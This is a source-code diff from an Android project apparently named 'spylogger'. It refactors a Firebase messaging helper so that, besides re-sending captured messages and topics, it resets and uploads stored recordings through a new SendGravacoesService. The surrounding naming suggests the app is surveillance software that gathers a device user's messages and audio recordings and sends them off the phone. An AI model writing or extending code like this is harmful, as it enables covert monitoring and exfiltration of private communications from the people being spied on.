@@ -8,9 +8,11 @@ import com.gravatasufoca.spylogger.helpers.TaskComplete;
 import com.gravatasufoca.spylogger.model.Configuracao;
 import com.gravatasufoca.spylogger.model.Mensagem;
 import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
+import com.gravatasufoca.spylogger.repositorio.RepositorioGravacao;
 import com.gravatasufoca.spylogger.repositorio.RepositorioMensagem;
 import com.gravatasufoca.spylogger.repositorio.RepositorioTopico;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
+import com.gravatasufoca.spylogger.repositorio.impl.RepositorioGravacaoImpl;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioMensagemImpl;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioTopicoImpl;
 import com.gravatasufoca.spylogger.utils.Utils;
@@ -115,22 +117,31 @@ public class FcmHelperService {
         }
     }
 
-    private void reenviarMensagens(boolean reativar) {
+    private void reativarMensagens(){
         try {
-            if(reativar) {
-                RepositorioTopico repositorioTopico = new RepositorioTopicoImpl(context);
-                RepositorioMensagem repositorioMensagem = new RepositorioMensagemImpl(context);
+            RepositorioTopico repositorioTopico = new RepositorioTopicoImpl(context);
+            RepositorioMensagem repositorioMensagem = new RepositorioMensagemImpl(context);
+            RepositorioGravacao repositorioGravacao = new RepositorioGravacaoImpl(context);
 
-                repositorioTopico.reativar();
-                repositorioMensagem.reativar();
-            }
-
-            SendMensagensService sendMensagensService=new SendMensagensService(context,null);
-            sendMensagensService.enviarTopicos();
-
+            repositorioTopico.reativar();
+            repositorioMensagem.reativar();
+            repositorioGravacao.reativar();
         } catch (SQLException e) {
             e.printStackTrace();
         }
+    }
+
+    private void reenviarMensagens(boolean reativar) {
+        if(reativar) {
+           reativarMensagens();
+        }
+
+        SendMensagensService sendMensagensService=new SendMensagensService(context,null);
+        sendMensagensService.enviarTopicos();
+
+        SendGravacoesService sendGravacoesService=new SendGravacoesService(context,null);
+        sendGravacoesService.enviarTopicos();
+
     }
 
 
